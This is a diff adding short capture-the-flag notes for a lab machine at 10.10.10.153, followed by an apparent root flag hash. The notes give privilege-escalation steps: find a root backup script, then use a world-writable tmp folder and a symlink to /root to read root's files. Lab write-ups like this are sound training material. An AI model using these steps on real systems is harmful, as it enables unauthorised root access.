@@ -1,0 +1,21 @@
+#10.10.10.153
+--------------
+#analyse what is happening in gioanni home directory and which script is doing this
+#try to find which processes are running
+ps | grep sh
+#find shell script  (/usr/bin/backup.sh)
+#analyse it
+# /home/giovanni/work/tmp/ folder has full permission (777)
+
+#inside /home/giovanni/work/tmp/ directory use symlink to connect with /root directory
+ln -s /home/giovanni/work/tmp/ /root/root.txt
+		OR
+ln -s /root/ /home/giovanni/work/tmp    (right one)
+#wait for some time
+
+#change directory to root from same location (/home/giovanni/work/tmp)
+cd /root
+
+
+#key
+4f3a83b42ac7723a508b8ace7b8b1209
